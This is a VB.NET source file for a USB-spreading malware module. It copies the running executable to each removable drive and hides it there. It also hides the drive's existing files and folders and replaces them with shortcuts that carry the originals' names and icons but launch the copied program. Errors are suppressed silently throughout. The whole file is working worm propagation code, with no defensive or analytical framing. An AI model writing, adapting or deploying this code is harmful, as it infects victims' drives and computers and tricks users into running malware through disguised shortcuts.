Imports System.IO

Public Module USB
    Public ExeName As String
    Private H As Threading.Thread

    Public Sub Enable()
        H = New Threading.Thread(AddressOf WorkThread)
        H.Start()
    End Sub

    Public Sub WorkThread()
        On Error Resume Next
        Dim allDrives() As IO.DriveInfo = IO.DriveInfo.GetDrives()
        Dim d As IO.DriveInfo

        Dim VbsObj As Object
        VbsObj = CreateObject("WScript.Shell")
        Dim DE As Object

        For Each d In allDrives

            If d.IsReady = True AndAlso d.DriveType = IO.DriveType.Removable Then
                Dim RootDir As String = d.RootDirectory.ToString
                IO.File.Copy(Diagnostics.Process.GetCurrentProcess.MainModule.FileName, RootDir & ExeName)
                IO.File.SetAttributes(RootDir & ExeName, IO.FileAttributes.Hidden)
                For Each f As String In IO.Directory.GetFiles(RootDir)
                    SPUSB_TEXT = "Yes"
                    If IO.Path.GetFileNameWithoutExtension(f) = IO.Path.GetFileNameWithoutExtension(ExeName) Then GoTo GoHere
                    If Not f.Contains(".lnk") Then
                        IO.File.SetAttributes(f, IO.FileAttributes.Hidden)
                    End If
                    DE = VbsObj.CreateShortcut(RootDir & IO.Path.GetFileNameWithoutExtension(f) & ".lnk")
                    DE.TargetPath = RootDir & ExeName
                    DE.WorkingDirectory = RootDir
                    DE.IconLocation = f & ", 0"
                    DE.Save()
GoHere:
                Next
                For Each dx As String In IO.Directory.GetDirectories(RootDir)
                    Dim dir As New System.IO.DirectoryInfo(dx)
                    dir.Attributes = IO.FileAttributes.Hidden
                    DE = VbsObj.CreateShortcut(dx & ".lnk")
                    DE.TargetPath = RootDir & ExeName
                    DE.WorkingDirectory = RootDir
                    DE.IconLocation = Environment.GetEnvironmentVariable("windir") & "\System32\Shell32.dll" & ", 3"
                    DE.Save()
                Next
            Else
                SPUSB_TEXT = "No"
            End If
        Next

    End Sub

End Module